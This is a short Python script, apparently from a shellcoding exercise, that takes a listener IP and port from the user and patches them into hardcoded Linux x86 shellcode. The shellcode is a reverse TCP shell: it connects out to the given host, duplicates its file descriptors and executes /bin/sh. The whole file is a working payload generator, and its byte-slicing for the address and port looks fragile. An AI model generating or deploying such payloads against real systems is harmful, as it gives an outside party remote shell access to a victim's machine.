import sys
import binascii
import socket
import ipaddress


newport = input('four digit LPORT: ')
newip = input('LHOST: ')

newip =  str(binascii.hexlify(socket.inet_aton(newip)))

newip = "\\x" + newip[2:-7] + "\\x" + newip[4:-5] + "\\x" + newip[6:-3] + "\\x"+ newip[8:-1]

newport = hex(int(newport))

newport =  "\\" + newport[1:-2] + "\\x" + newport[4:]

shellcode = "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\x53\\x43\\x6a\\x01\\x6a"
shellcode += "\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x43\\x31\\xd2\\x68"
shellcode += "\\xc0\\xa8\\x01\\x11\\x66\\x68\\x05\\x39\\x66\\x6a\\x02\\x89\\xe1\\x6a"
shellcode += "\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x6a\\x02\\x59\\xb0\\x3f"
shellcode += "\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73"
shellcode += "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80"

ipaddr = "\\xc0\\xa8\\x01\\x11"


port = "\\x05\\x39"


shellcode = shellcode.replace(ipaddr, newip)

shellcode = shellcode.replace(port, newport)

print('Updated shellcode: ' + shellcode)


